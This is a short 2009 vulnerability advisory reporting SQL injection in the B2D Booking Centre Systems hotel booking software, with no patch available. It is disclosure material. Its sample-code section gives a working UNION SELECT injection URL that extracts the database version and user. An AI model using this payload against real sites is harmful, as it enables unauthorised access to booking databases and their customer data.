@@ -1,0 +1,52 @@
+ Name              B2D Booking Centre Systems
+ Vendor            http://www.bookingcentre.eu
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2009-12-11
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ VI.   DISCLOSURE TIMELINE
+
+
+I. ABOUT THE APPLICATION
+
+Booking Centre Systems is a multilingual low cost and high
+performance software solution for any Individual Hotel  or
+Hotels Group or Portal Tourist.
+
+
+II. DESCRIPTION
+
+All  parameters  of  this  application  are  not  properly
+sanitised and are affected to SQL Injection.
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) SQL Injection
+
+A) SQL Injection
+
+All parameters are not properly sanitised and in order to
+exploit they, the Magic Quotes GPG may be On.
+
+
+IV. SAMPLE CODE
+
+http://site/hotel_tiempolibre_ext.php?HotelID=4&NoticiaID=-1 UNION ALL
+SELECT 1,2,3,version(),5,user(),7,8,9%23
+
+
+V. FIX
+
+No patch.
